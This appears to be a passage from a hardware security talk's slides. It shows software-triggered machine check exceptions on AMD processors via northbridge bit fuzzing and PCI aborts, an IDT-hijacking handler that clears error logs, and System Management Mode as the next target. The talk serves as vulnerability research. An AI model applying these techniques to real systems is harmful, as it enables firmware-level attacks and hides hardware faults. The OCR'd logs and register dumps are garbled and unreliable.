"Address/Command parity error" "HBM Write data parity error" "Consolidated SRAM ECC error" "Reserved" "Reserved" "Rdb SRAM ECC error" "Thermal throttling" "HBM Read Data Parity error" "Reserved" "UMC FW Error" "SRAM Parity Error" "HBM CRC Error" "DRAM ECC error" "Data poison error" "SDP parity error" "Reserved" "Address/Command parity error" "Write data parity error" "DCQ SRAM ECC error" "Reserved" "Read data parity error" "Rdb SRAM ECC error" "RdRsp SRAM ECC error" "LM32 MP errors" "Counter overflow error" "Counter underflow error" "Write Data Parity Error" "Read Response Parity Error" "Cache Tag ECC Error Macro 0" "Cache Tag ECC Error Macro 1" "Cache Data ECC Error" "An ECC error in the Parameter Block RAM array" "An ECC or parity error in a PSP RAM instance" "High SRAM ECC or parity error" "Low SRAM ECC or parity error" "Instruction Cache Bank 0 ECC or parity error" "Instruction Cache Bank 1 ECC or parity error" "Instruction Tag Ram 0 parity error" "Instruction Tag Ram 1 parity error" "Data Cache Bank 0 ECC or parity error" "Data Cache Bank 1 ECC or parity error" "Data Cache Bank 2 ECC or parity error" "Data Cache Bank 3 ECC or parity error" "Data Tag Bank 0 parity error" "Data Tag Bank 1 parity error" "Data Tag Bank 2 parity error" "Data Tag Bank 3 parity error" "Dirty Data Ram parity error" "TLB Bank 0 parity error" "TLB Bank 1 parity error" "System Hub Read Buffer ECC or parity error" "FUSE IP SRAM ECC or parity error" "PCRU FUSE SRAM ECC or parity error" "SIB SRAM parity error" "mpASP SECEMC Error" "mpASP A5 Hang" "SIB WDT error" "An ECC or parity error in an SMU RAM instance" "High SRAM ECC or parity error" "Low SRAM ECC or parity error" "Data Cache Bank A ECC or parity error" "Data Cache Bank B ECC or parity error" "Data Tag Cache Bank A ECC or parity error" "Data Tag Cache Bank B ECC or parity error" "Instruction Cache Bank A ECC or parity error" "Instruction Cache Bank B ECC or parity error" "Instruction Tag Cache Bank A ECC or parity error" "Instruction Tag Cache Bank B ECC or parity error" "System Hub Read Buffer ECC or parity error" "PHY RAS ECC Error" "Reserved" "A correctable error from a GFX Sub-IP" "A fatal error from a GFX Sub-IP" "Reserved" "Reserved" "A poison error from a GFX Sub-IP" "Reserved" "High SRAM ECC or parity error" "Low SRAM ECC or parity error" "Data Cache Bank A ECC or parity error" "Data Cache Bank B ECC or parity error" "Data Tag Cache Bank A ECC or parity error" "Data Tag Cache Bank B ECC or parity error" "Instruction Cache Bank A ECC or parity error" "Instruction Cache Bank B ECC or parity error" "Instruction Tag Cache Bank A ECC or parity error" "Instruction Tag Cache Bank B ECC or parity error" "Fuse SRAM ECC or parity error" "Main SRAM [31:0] bank ECC or parity error" "Main SRAM [63:32] bank ECC or parity error" "Main SRAM [95:64] bank ECC or parity error" "Main SRAM [127:96] bank ECC or parity error" "Data Cache Bank A ECC or parity error" "Data Cache Bank B ECC or parity error" "Data Tag Cache Bank A ECC or parity error" "Data Tag Cache Bank B ECC or parity error" "Instruction Cache Bank A ECC or parity error" "Instruction Cache Bank B ECC or parity error" "Instruction Tag Cache Bank A ECC or parity error" "Instruction Tag Cache Bank B ECC or parity error" "Data Cache Bank A ECC or parity error" "Data Cache Bank B ECC or parity error" "Data Tag Cache Bank A ECC or parity error" "Data Tag Cache Bank B ECC or parity error" "Instruction Cache Bank A ECC or parity error" "Instruction Cache Bank B ECC or parity error" "Instruction Tag Cache Bank A ECC or parity error" "Instruction Tag Cache Bank B ECC or parity error" "Data Cache Bank A ECC or parity error" "Data Cache Bank B ECC or parity error" "Data Tag Cache Bank A ECC or parity error" "Data Tag Cache Bank B ECC or parity error" "Instruction Cache Bank A ECC or parity error" "Instruction Cache Bank B ECC or parity error" "Instruction Tag Cache Bank A ECC or parity error" "Instruction Tag Cache Bank B ECC or parity error" "System Hub Read Buffer ECC or parity error" "MPDMA TVF DVSEC Memory ECC or parity error" "MPDMA TVF MMIO Mailbox0 ECC or parity error" "MPDMA TVF MMIO Mailbox1 ECC or parity error" "MPDMA TVF Doorbell Memory ECC or parity error" "MPDMA TVF SDP Slave Memory 0 ECC or parity error" "MPDMA TVF SDP Slave Memory 1 ECC or parity error" "MPDMA TVF SDP Slave Memory 2 ECC or parity error" "MPDMA TVF SDP Master Memory 0 ECC or parity error" "MPDMA TVF SDP Master Memory 1 ECC or parity error" "MPDMA TVF SDP Master Memory 2 ECC or parity error" "MPDMA TVF SDP Master Memory 3 ECC or parity error" "MPDMA TVF SDP Master Memory 4 ECC or parity error" "MPDMA TVF SDP Master Memory 5 ECC or parity error" "MPDMA TVF SDP Master Memory 6 ECC or parity error" "SDP Watchdog Timer expired" "MPDMA PTE Command FIFO ECC or parity error" "MPDMA PTE Hub Data FIFO ECC or parity error" "MPDMA PTE Internal Data FIFO ECC or parity error" "MPDMA PTE Command Memory DMA ECC or parity error" "MPDMA PTE Command Memory Internal ECC or parity error" "MPDMA TVF SDP Master Memory 7 ECC or parity error" "ECC or Parity error" "PCIE error" "External SDP ErrEvent error" "SDP Egress Poison error" "Internal Poison error" "Internal system fatal error event" "CCIX PER Message logging" "CCIX Read Response with Status: Non-Data Error" "CCIX Write Response with Status: Non-Data Error" "CCIX Read Response with Status: Data Error" "CCIX Non-okay write response with data error" "SDP Data Parity Error logging" "Data Loss Error" "Training Error" "Flow Control Acknowledge Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error" "CRC Error" "BER Exceeded Error" "Tx Vcid Data Error" "Replay Buffer Parity Error" "Data Parity Error" "Replay Fifo Overflow Error" "Replay Fifo Underflow Error" "Elastic Fifo Overflow Error" "Deskew Error" "Flow Control CRC Error" "Data Startup Limit Error" "FC Init Timeout Error" "Recovery Timeout Error" "Ready Serial Timeout Error" "Ready Serial Attempt Error" "Recovery Attempt Error" "Recovery Relock Attempt Error" "Replay Attempt Error" "Sync Header Error" "Tx Replay Timeout Error" "Rx Replay Timeout Error" "LinkSub Tx Timeout Error" "LinkSub Rx Timeout Error" "Rx CMD Pocket Error" "RAM ECC Error" "ARC instruction buffer parity error" "ARC data buffer parity error" "PHY APB error" "Timeout error from GMI" "SRAM ECC error" "NTB Error Event" "SDP Parity error" "Parity error for port 0" "Parity error for port 1" "Parity error for port 2" "Parity error for port 3" "Parity error for port 4" "Parity error for port 5" "Parity error for port 6" "Parity error for port 7" "Parity error or ECC error for S0 RAM0" "Parity error or ECC error for S0 RAM1" "Parity error or ECC error for S0 RAM2" "Parity error for PHY RAM0" "Parity error for PHY RAM1" "AXI Slave Response error" "Mst CMD Error" "Mst Rx FIFO Error" "Mst Deskew Error" "Mst Detect Timeout Error" "Mst FlowControl Error" "Mst DataValid FIFO Error" "Mac LinkState Error" "Deskew Error" "Init Timeout Error" "Init Attempt Error" "Recovery Timeout Error" "Recovery Attempt Error" "Eye Training Timeout Error" "Data Startup Limit Error" "LS0 Exit Error" "PLL powerState Update Timeout Error" "Rx FIFO Error" "Lcu Error" "Conv CECC Error" "Conv UECC Error" "Reserved" "Rx DataLoss Error" "Replay CECC Error" "Replay UECC Error" "CRC Error" "BER Exceeded Error" "FC Init Timeout Error" "FC Init Attempt Error" "Replay Timeout Error" "Replay Attempt Error" "Replay Underflow Error" "Replay Overflow Error" "Packet Type Error" "Rx FIFO Error" "Deskew Error" "Rx Detect Timeout Error" "Data Parity Error" "Data Loss Error" "Lcu Error" "HB1 Handshake Timeout Error" "HB2 Handshake Timeout Error" "Clk Sleep Rsp Timeout Error" "Clk Wake Rsp Timeout Error" "Reset Attack Error" "Remote Link Fatal Error" "Data Loss Error" "Training Error" "Replay Parity Error" "Rx Fifo Underflow Error" "Rx Fifo Overflow Error" "CRC Error" "BER Exceeded Error" "Tx Fifo Underflow Error" "Replay Buffer Parity Error" "Tx Overflow Error" "Replay Fifo Overflow Error" "Replay Fifo Underflow Error" "Elastic Fifo Overflow Error" "Deskew Error" "Offline Error" "Data Startup Limit Error" "FC Init

## Slide 75

⊷Need to start somewhere.

⊷Some platforms reserve MC4 register bank for logging errors from the northbridge ⊷NB seems more configurable than others ⊸ vs. DC, IC, BU, FR, etc. ⊷Start there, expand later ⊷Details vary across generations

52740_16h_Models_30h-3Fh_BKDG.pdf

generating MCEs

## Slide 76

⊷Datasheets suggest MCEs can be generated from Master Abort signals arriving from NB

52740_16h_Models_30h-3Fh_BKDG.pdf

generating MCEs

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
-~Latasheets suggest MCEs can be generated
from Master Abort signals arriving from NB
Table 232: MC4 Error Descriptions
Link-defined sync error p: detected on link. The NB SyncePktEn
floods its outgoing link:
packets after detecting a sync packet on an incoming link
independent of the state of the control bits.
Master Abort |Master abort seen as result of link operation. Reasons for this |MstrAbortEn
error include requests to non-existent addresses. The NB
returns an error r se back to the requestor with any
ciated data all 1s independent of the state of the control bit.
Target Abort _ |Target abort seen as result of link operation. The NB returns an |TgtAbortEn
error response back to the requestor with any associated data
all 1s independent of the state of the control bit.
52740_16h_Models_30h-3Fh_BKDG.pdf
generating MCES
```

## Slide 77

## ⊷Master abort

⊸ Device initiating PCI request terminates transaction because target device failed to respond ⊸ Something we can control

⊷Easy! Access a non-existent PCI device: sudo setpci -A linux-sysfs -s 0:1f.0 0.L ⊷Nothing.

generating MCEs

## Slide 78

⊷But datasheets suggest there is some way for a master abort to cause an MCE ⊷Dive into the northbridge configuration

generating MCEs

## Slide 79

## ⊷Bits of interest in B/D/F 0/18/3:

|0:18.3 0x180[3]:
ChgDatErrToTgtAbort|0:18.3 0x40[9]:
TgtAbortEn|0:18.3 0x44[28]:
DisTgtAbortCpuErrRsp|
|---|---|---|
|0:18.3 0x180[5]:
DisPciCfgCpuMstAbortRsp|0:18.3 0x44[1]:
CpuRdDatErrEn|0:18.3 0x44[2]:
SyncFloodOnDramUcEcc|
|0:18.3 0x180[6]:
SyncFloodOnDatErr|0:18.3 0x44[20]:
SyncFloodOnWDT|0:18.3 0x44[3]:
SyncPktGenDis|
|0:18.3 0x180[7]:
SyncFloodOnTgtAbortErr|0:18.3 0x44[21]:
SyncFloodOnAnyUcErr|0:18.3 0x44[4]:
SyncPktPropDis|
|0:18.3 0x40[12]:
WDTRptEn|0:18.3 0x44[24]:
IoRdDatErrEn|0:18.3 0x44[5]:
IoMstAbortDis|
|0:18.3 0x40[31]:
McaCpuDatErrEn|0:18.3 0x44[25]:
DisPciCfgCpuErrRsp|0:18.3 0x44[6]:
CpuErrDis|
|0:18.3 0x40[5]:
SyncPktEn|0:18.3 0x44[26]:
FlagMcaCorrErr|0:18.3 0x44[7]:
IoErrDis|
|0:18.3 0x40[8]:
MstrAbortEn|0:18.3 0x44[27]:
NbMcaToMstCpuEn|0:18.3 0x44[8]:
WDTDis|

# generating MCEs

## Slide 80

⊷No single bit gives the desired behavior

⊷Many configurations crash or hang

⊷Too many permutations, not enough information

generating MCEs

## Slide 81

⊷A northbridge fuzzer

⊸ Specify the bits of interest (~24 plausible config bits identified)

⊸ Randomly flip a bit

⊸ If crash/hang:

⊶ Power cycle and try again

⊸ Access a non-existent device in the PCI space ⊸ Check MCA status registers for MCE logged

⊶ If platform resets,

MCA status registers are sticky, check on boot

⊸ Repeat

generating MCEs

## Slide 82

(demo)

generating MCEs

## Slide 83

generating MCEs

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
deltaop@ubuntu-usb-3:~/_research$ []
```

## Slide 84

generating MCEs

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Mmmm mmm mmm mmm mmm mmm mmm mM MMMM MAM MMMM MMM I
PREPBRBBPRBPBBBBBBBBBBRBPBBBBBPBBBBPRBPBBBBBBBBEBBEBE
237854]
. 239084]
. 239306]
. 253738 ]
. 253884]
. 255088 ]
255332]
. 286843]
. 302307]
. 302384]
. 302474]
. 302615]
. 302656]
. 303316]
. 303383]
. 303436]
. 304778]
. 306110]
. 306121]
. 308865]
. 308960]
. 310145]
. 312692]
. 313970]
315468]
. 318427]
. 321297]
. 323917]
. 325293]
. 326727]
. 328228]
. 329770]
. 331339]
. 332919]
. 334496]
. 336069]
. 337638]
. 341052]
. 343135]
. 344773]
. 346446]
. 354527]
: New USB device strings: MEr=0, Product=@, SerialNumber=0 —
: New USB device found, idVendor=0438, idProduct=7900, bcdDevice= 0.18
usb 1-1
hub 1-1:1.@: USB hub found
hub 1-1:1.0: 4 ports detected
usb 2-1
usb 2-1: New USB device strings: Mfr=@, Product=0, SerialNumber=0
hub 2-1:1.@: USB hub found
hub 2-1:1.0: 4 ports detected
Freeing initrd memory: 85444K
Segment Routing with IPv6
In-situ OAM (IOAM) with IPv6
NET: Registered PF_PACKET protocol family
Key type dns_resolver registered
x86/pm: family @x16 cpu detected, MSR saving is needed during suspending.
microcode: CPU@: patch_level=0x07030105
microcode: CPU1: patch_level=0x07030105
microcode: CPU2: patch_level=0x07030105
microcode: CPU3: patch_level=0x07030105
microcode: Microcode Update Driver: v2.2.
IPI shorthand broadcast: enabled
mce: [Hardware Error]: Machine check events logged
registered taskstats version 1
mce: [Hardware Error]: CPU 1: Machine Check: @ Bank @: b60000000000083b
mce: [Hardware Error]: TSC @ ADDR fdfc000
cfc
mce: [Hardware Error]: PROCESSOR 2:730f01 TIME 1753409480 SOCKET @ APIC 1 microcode 7030105
Loading compiled-in X.509 certificates
Loaded X.5@9 cert ‘Build time qutogenerated kernel key: d5862910adca7ee16194da1e1a805db529424367'
Loaded X.509 cert ‘Canonical Ltd. Live Patch Signing: 14d£34d1087cf£37625abecO39ef2bf521249b969 '
Loaded X.5@9 cert ‘Canonical Ltd. Kernel Module Signing: 88£752e560a1e0737e31163a466ad7b70a850c19'
blacklist: Loading compiled-in revocation X.509 certificates
Loaded X.5@9 cert ‘Canonical Ltd. Secure
Loaded X.509 cert ‘Canonical Ltd. Secure
Loaded X.5@9 cert ‘Canonical Ltd. Secure
Loaded X.5@9 cert 'Canonical Ltd. Secure
Loaded X.509 cert ‘Canonical Ltd. Secure
Loaded X.5@9 cert ‘Canonical Ltd. Secure
Loaded X.509 cert ‘Canonical Ltd. Secure
Loaded X.5@9 cert ‘Canonical Ltd. Secure
zswap: loaded using pool 1zo/zbud
Key type .fscrypt registered
Key type fscrypt-provisioning registered
Key type trusted registered
Key type encrypted registered
Boot
Boot
Boot
Boot
Boot
Boot
Boot
Boot
Signing:
Signing
Signing
Signing
Signing
Signing
Signing
Signing
61482aa2830d@ab2ad5af10b7250da9033ddcefa'
(2017): 242ade75ac4a15e50d50c84b0d45f f3eae707a03'
(ESM 2018): 365188c1d374d6b07c3c8f£240f8ef722433d6a8b'
(2019): c@746£d6c5da3ae827864651ad66ae47fe24b3e8'
(2021 v1): a8d54bbb3825cf£b94fa13c9f£8a594a195c107b8d'
(2021 v2): 4cf£046892d6£d3c9a5b03£98d845£90851dc6a8c '
(2021 v3): 100437bb6de6e469b581e61cd66bce3ef4ed53af '
(Ubuntu Core 2019): c1d57b8£6b743f£23ee41£4f7ee292f06eecadfb9'
```

## Slide 85

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
--- MC@ (load-store) ---
[core ]
mc@_ctl
mcQ_status
mcQ_addr
mcO_misc
mcQ_mask
[core 1]
mc@_ctl
mcQ_status
mc@_addr
mcQ_misc
mc@_mask
[core 2]
mc@_ctl
mcQ_status
mc@_addr
mcO_misc
mc@_mask
[core 3]
mc@_ctl
mcQ_status
mc@_addr
mcQ_misc
mcQ_mask
(00000400) :
(00000401):
(00000402) :
(00000403) :
(c@010044):
(00000400) :
(00000401) :
(00000402) :
(00000403) :
(c0010044):
(00000400) :
(00000401):
(00000402) :
(00000403) :
(c0010044):
(00000400) :
(00000401):
(00000402) :
(00000403) :
(c0010044):
eo
X XX XX
Nm oO
on
a
ef
XXXXXX XXXXXXX
NM
©
ar
Nr
Y)
®@ @
8 4 @
XXXXXXX XX
XXXXXXX XX
QADAMA A
(
fec)
Q)
0)
0)
0)
fec)
x XXX XX
XX = XXXXXX
(b60000000000083b )
(
fdfc@00cfc)
XXXXXXX XX
XXXXXXX XX
t
(
QAAMTI A
AAAI
U)
Q)
fec)
Q)
Q)
0)
0)
fec)
Q)
Q)
))
Q)
```

## Slide 86

⊷Found a 2-bit northbridge combination that works ⊷But MCE delivered to core that generates the abort ⊷Not useful for core to target itself with an MCE

   - ⊸ Can only interrupt our own code this way

- ⊷We have a hammer, but we can only hit ourselves

⊷Need ability for one core to target different core

- generating cross core MCEs

## Slide 87

Let’s build a hammer… Let's add a handle…

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Let’s build a hammer...
Let's add a handle...
```

## Slide 88

⊷Modify fuzzer

- ⊸ Search for more complex bit configurations

- ⊸ Generate PCI abort on from one core, check MCEs on others

- generating cross core MCEs

## Slide 89

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Ammmmmmmmmmmmmm mmm mmmmm mmm mmm mmm m mmm mmm meee
PREPRPRPRBRBRBPRBRBPBPRPBRBBPBPBBBBBBBRBPBBBEBEBPBPBBBBBBBBBBEBEEE!
234111]
.235420]
. 236579]
. 245835]
. 245977]
247335]
. 248317]
- 279300] Freeing
. 293227]
. 293304]
293388]
.293539] Key type dns_resolver registered
- 293580] family 0x16 cpu detected, MSR saving is needed during suspending.
. 294209]
.294261]
.294314]
. 295677]
.297001]
.297012]
.299767] mce
.299871]
. 300976]
KURKKYAl
. 304506]
. 305953]
. 308733]
333134] Key type
-334719] Key type
. 336350] Ke
- 344522] Key type
. 346149] AppArmor:
.351789] integrity: Loading X.509 certificate: UEFI:db
usb
hub
hub
usb
usb
hub
hub
teeter ein ee ieee nnn fir he eli en keds f
: New
:1.0:
71.0:
: New
: New
:1.0@: USB hub found
1.0: 4 ports detected
initrd memory: 85444K
Segment Routing with IPv6
In-situ OAM (IOAM) with IPv6
NET: Registered PF_PACKET protocol family
USB hub found
4 ports detected
2- 1:
x86/pm:
microcode: CPUQ@: patch_level=0x07030105
microcode: CPU1: patch_level=0x07030105
microcode: CPU2: patch_level=0x07030105
microcode: CPU3: patch_level=0x07030105
microcode: Microcode Update Driver: v2.2.
IPI shorthand broadcast: enabled
: [Hardware Error]: Machine check events lo
registered taskstats version 1
mce: [Hardware Error]: TSC @ ADDR fdfc00cfc
mce:
Loading compiled-in X.509 certificates
-fscrypt registered
fscrypt-provisioning registered
trusted registered
encrypted registered
AppArmor shal policy hashing enabled
y type
gged
Te ONe ee ee
USB device strings: Mfr=@, Product=@, SerialNumber=0
USB device found, idVendor=0438, idProduct=7900, bcdDevice= 0.18
USB device strings: Mfr=@, Product=@, SerialNumber=0
mce: [Hardware Error]: CPU @: Machine Check: @ Bank 4: b70000110003081b
[Hardware Error]: PROCESSOR 2:730£01 TIME 1753410695 SOCKET @ APIC @ microcode 7030105
Loaded X.509 cert 'Build time autogenerated kernel key: d586291@adca7ee16194da1e1a805db529424367'
311337] Loaded X.509 cert ‘Canonical Ltd. Live Patch Signing: 14d£34d1a87c£37625abecO39ef2b£521249b969'
. 313937] Loaded X.509 cert ‘Canonical Ltd. Kernel Module Signing: 88£752e560a1e0737e31163a466ad7b70a850c19'
- 315301] blacklist: Loading compiled-in revocation X.509 certificates
. 316739] Loaded X.509 cert ‘Canonical Ltd. Secure Boot Signing: 61482aa283@d@ab2ad5af10b7250da9033ddcefa'
. 318252] Loaded X.5@9 cert ‘Canonical Ltd. Secure Boot Signing (2017): 242ade75ac4a15e50d50c84b0d45f f3eae707a03'
. 319787] Loaded X.5@9 cert ‘Canonical Ltd. Secure Boot Signing (ESM 2018): 365188c1d374d6b07c3c8f240f8ef722433d6a8b'
. 321366] Loaded X.509 cert ‘Canonical Ltd. Secure Boot Signing (2019): c0746fd6c5da3ae827864651ad66ae47£e24b3e8 '
. 322941] Loaded X.509 cert ‘Canonical Ltd. Secure Boot Signing (2021 v1): a8d54bbb3825cfb94fa13c9£8a594a195c107b8d'
- 324520] Loaded X.509 cert ‘Canonical Ltd. Secure Boot Signing (2021 v2): 4cf£046892d6fd3c9a5b03£98d845£90851dc6a8c'
. 326093] Loaded X.509 cert ‘Canonical Ltd. Secure Boot Signing (2021 v3): 100437bb6de6e469b581e61cd66bce3ef4ed53af'
. 327659] Loaded X.5@9 cert ‘Canonical Ltd. Secure Boot Signing (Ubuntu Core 2019): c1d57b8£6b743f23ee41£4£7ee292f06eecad£b9'
. 331069] zswap: loaded using pool 1z0/zbud
```

## Slide 90

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
--- MC4 (northbridge) ---
[core @]
me4_ctl
mc4_status
mc4_addr
mc4_misc®
mc4_misc1
mc4_misc2
mc4_mask
[core 1]
me4_ctl
mc4_status
mc4_addr
mc4_misc®
mc4_misc1
mc4_misc2
mc4_mask
[core 2]
me4_ctl
mc4_status
mc4_addr
mc4_misc®
mc4_misc1
mc4_misc2
mc4_mask
[core 3]
mce4_ctl
mc4_status
mc4_addr
mc4_misc®
mc4_miscl
mc4_misc2
mc4_mask
(00000410) :
(00000411):
(00000412):
(00000413):
(c@000408) :
(c@Q00409) :
(c@010048) :
(00000410) :
(00000411):
(00000412):
(00000413):
(c0000408) :
(c@Q00409) :
(c@010048) :
(00000410) :
(00000411):
(00000412):
(00000413):
(c@Q00408) :
(c@000409) :
(c0010048) :
(00000410) :
(00000411):
(00000412) :
(00000413):
(c@Q00408) :
(c0000409) :
(c0010048) :
XXXXXXXXKXXXXXXXKXKXKXXKXKXKXKXKXXKXKXKXKXXXX,
( f£fffffff)
X XX XXX
XXXXXX XXXXXXX
(b7@000110003081b)
( fdfc000cfc)
x
x
( cULQUUBBULBBUUUU )
( 10000001000000)
( Q)
( 4000000)
0)
0)
Q)
1000000)
1000000)
0)
0)
LAQTDAIINIS
0)
0)
0)
1000000)
1000000)
0)
Q)
AQTDAIIIS
Q)
0)
Q)
1000000)
1000000)
oD)
oD)
LADADI IIS
```

## Slide 91

⊷Found 3-bit northbridge configuration where non-core-0 generates PCI abort, delivered as MCE on core-0 ⊷Issue: platform still resets

- generating cross core MCEs

## Slide 92

Let’s build a hammer… Let's add a handle… Let’s … be a bit more careful

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Let’s build a hammer...
Let's add a handle...
Let’s ... be a bit more careful
```

## Slide 93

⊷Interrupting core-0 from core-1 is not useful if the platform immediately resets ⊷Operating system is responsible for MCE handling ⊷Hijack CPU interrupt table to install first-pass MCE handler

staying alive

## Slide 94

push   %rax
push   %rdi
push   %rsi
OS IDT
push   %rdx
push   %rcx
…
push   %r8
push   %r9
push   %r10
ffffffffc0b2ed40
push   %r11
mov    $0x3,%rdi
ffffffffc0b2ed80 mov    $0xfe,%rsi
mov    0x48(%rsp),%rdx
CPU ffffffffc0b2edc0 mov    0x50(%rsp),%r10
callq  1180 <os_handler>
pop    %r11
ffffffffc0b2ee40
pop    %r10
pop    %r9
ffffffffc0b2ee80 pop    %r8
pop    %rcx
pop    %rdx
… pop    %rsi
pop    %rdi
pop    %rax
iretq

CPU

## Slide 95

Hijack IDT
…
ffffffffc0197d20
ffffffffc0197d60
CPU
ffffffffc0197da0
ffffffffc0197ee0
ffffffffc0197e20
…

push   %rax push   %rdi push   %rsi OS IDT push   %rdx push   %rcx … push   %r8 push   %r9 push   %r10 ffffffffc0b2ed40 push   %r11 mov    $0x3,%rdi ffffffffc0b2ed80 mov    $0xfe,%rsi mov    0x48(%rsp),%rdx ffffffffc0b2edc0 mov    0x50(%rsp),%r10 callq  1180 <os_handler> pop    %r11 ffffffffc0b2ee40 pop    %r10 pop    %r9 ffffffffc0b2ee80 pop    %r8 pop    %rcx pop    %rdx … pop    %rsi pop    %rdi pop    %rax iretq

## Slide 96

|Hijack IDT|pushf
push %%rax
push %%rdi
push %%rsi
push %%rdx|OS IDT|push
push
push
push
|%rax
%rdi
%rsi
%rdx
|
|---|---|---|---|---|
|…|push %%rcx
push %%r8
push %%r9|…|push
push
push|%rcx
%r8
%r9|
|ffffffffc0197d20|push %%r10
push %%r11|ffffffffc0b2ed40|push
push
|%r10
%r11
|
||mov %0, %%rdi||mov|$0x3,%rdi|
|ffffffffc0197d60|mov %1, %%rsi|ffffffffc0b2ed80|mov
|$0xfe,%rsi
|
|ffffffffc0197da0
CPU|mov 0x48(%%rsp), %%rdx
mov 0x50(%%rsp), %%r10
callhijack_handler|ffffffffc0b2edc0|mov
mov
callq
|0x48(%rsp),%rdx
0x50(%rsp),%r10
1180 <os_handler>
|
|ffffffffc0197ee0|pop %%r11
pop %%r10|ffffffffc0b2ee40|pop
pop
|%r11
%r10
|
||pop %%r9||pop|%r9|
|ffffffffc0197e20|pop %%r8
pop %%rcx|ffffffffc0b2ee80|pop
pop
|%r8
%rcx
|
|…|pop %%rdx
pop %%rsi
pop %%rdi
pop %%rax
addq $8, %%rsp
popf
jmp *%2|…|pop
pop
pop
pop
iretq|%rdx
%rsi
%rdi
%rax|

## Slide 97

⊷Modified handler indiscriminately clears any logged MCE from the MCA banks before handing control to OS handler ⊸ OS won’t reset the platform if it can’t see what caused the MCE ⊸ Dangerous, but good enough

staying alive

## Slide 98

(demo)

staying alive

## Slide 99

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Every @.1s: cat /proc/interrupts | grep --color=always -e "“" -e "MCE.*" ubuntu-usb-3: Sat Aug 2 22:21:36 2025
CPU@ CPUL cPU2 CPU3
Q: 48 @ ) @ I0-APIC 2-edge timer
8: 1 ) @ @ I0-APIC 8-edge rtcd
9: ) Q a @ I0-APIC 9-fasteoi acpi
16: 1) 422 ) @ IO-APIC 16-fasteoi snd_hda_intel:card1
18: ) @ v) 33318 IO0-APIC 18-fasteoi ehci_hcd:usb1, ehci_hcd:usb2
25: Q @ Q Q@ PCI-MSI 34816-edge PCIe PME, pciehp
ra () @ ) Q@ PCI-MSI 36864-edge PCIe PME, pciehp
29: @ @ @ @ PCI-MSI 38912-edge PCIe PME, pciehp
31: Q @ v) Q@ PCI-MSI 40960-edge PCIe PME, pciehp
32: ) @ Q Q@ PCI-MSI 43008-edge PCIe PME, pciehp
33: () 327 10 @ PCI-MSI 278528-edge ahcil@000:00:11.0]
34: () @ 32 @ PCI-MSI 262144-edge xhei_hed
35: 1) 1) ) @  PCI-MSI 262145-edge xhci_hed
36: a () ) Q@ PCI-MSI 262146-edge xhei_hed
a7; () Q ) @  PCI-MSI 262147-edge xhci_hed
38: Q Q Q @  PCI-MSI 262148-edge xhci_hed
40: 1) 1) ) 993  PCI-MSI 2097152-edge enp4s0
42: () Q ) Q@ PCI-MSI 131073-edge ccp-1
44: 54 Q ) Q@ PCI-MSI 18432-edge snd_hda_intel:cardQ
46: ) ) 6 Q@ PCI-MSI 16384-edge radeon
NMI: ) ) @ @ Non-maskable interrupts
LOC: 15297 14171 15864 18674 Local timer interrupts
SPU: Q Q a ® Spurious interrupts
PMI: 1) ) ) @ Performance monitoring interrupts
IWI: 3944 3774 3989 3742 IRQ work interrupts
RTR: ) @ @ Q@ APIC ICR read retries
RES: 1177 1419 1500 1178 Rescheduling interrupts
CAL: 26427 19112 21529 15558 Function call interrupts
TLB: 208 146 152 179 TLB shootdowns
TRM: @ @ @ @ Thermal event interrupts
THR: @ @ @ @ Threshold APIC interrupts
DFR: 1) ) ) @ Deferred Error APIC interrupts
MCE: () () U) @ Machine check exceptions
MCP: 1 1 1 1 Machine check polls
ERR: )
MIS: Q
PIN: 1) Q ) @ Posted-interrupt notification event
NPI: @ ) ) @ Nested posted-interrupt event
PIW: @ @ @ @ Posted-interrupt wakeup event
deltaop@ubuntu-usb-3:~/_research$ []
"ubuntu-usb-3" 22:21 @2-Aug-259f
```

## Slide 100

⊷A state disruptor tool

⊷On-demand generation of hardware MCEs entirely from software

⊷Moving forward

⊸ We’ll use the NB approach for MCE generation

⊸ Configuration specifics will vary by platform

⊸ But barring this, many unexplored ways to generate MCEs

a state disruptor tool

## Slide 101

⊷What to target?

selecting a target

## Slide 102

Let’s build a hammer… Let's add a handle… Let’s be a bit more careful… Let’s find a nail…

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
_et’s build ahammer...
| et's add a handle...
| et’s be a bit more Careful...
| et’s find a nail...
```

## Slide 103

⊷Current MCE approach uses ring-0 for northbridge reconfiguration

- ⊷Select targets more privileged than ring-0

   - ⊸ (We’ll revisit this requirement)

   - ⊸ Game not over at ring-0 – gets much, much deeper

- ⊷Possible options:

   - ⊸ Hypervisors, secure guests, enclaves, secure loader, etc.

- ⊷ System Management Mode is an appealing target

# selecting a target

## Slide 104

- ⊷35 years old

- ⊷Invisible to operating system, hypervisor, etc.

- ⊷Can preempt operating system, hypervisor, etc.

- ⊷Ring -2

- ⊷Critical to platform security, server RAS, client miscellanea

- ⊷Firmware R/W access in many configurations

system management mode

## Slide 105

RAM

CPU

## Slide 106

RAM

CPU

MMIO

RAM

## Slide 107

RAM

CPU

SMRAM

SMBASE BF80_0000

MMIO

RAM

## Slide 108

mov si,0x8148 o32 lgdt [cs:si] mov eax,0x3 mov cr0,eax jmp short 0x14 mov ax,0x18 mov ss,ax mov eax,0x9ffe2ff8 mov esp,eax RAM o32 push byte +0x10 mov ecx,0xc0010111 rdmsr mov ebx,eax add eax,0x803a push eax retfd ... SMBASE push rax push rdx SMRAM and rax,~0x7ffffff BF80_0000 CPU wrmsr mov rcx,rsi mov rax,0x9fff492c add rsp,byte +0x20 MMIO mov rcx,0xc0010015 rdmsr test al,0x1 jnz 0x6d3 pop rdx pop rax mov rcx,0xc0010112 wrmsr RAM pop rdx pop rax mov rcx,0xc0010113 wrmsr rsm

## Slide 109

|CPU|
|---|

RAM SMBASE SMRAM BF80_0000 MMIO RAM

## Slide 110

I/O Device SMI CPU

RAM SMBASE SMRAM BF80_0000 MMIO RAM

## Slide 111

I/O
Device
microcode
RAM
SMI
SMBASE
SMRAM
BF80_0000
CPU
MMIO
RAM

## Slide 112

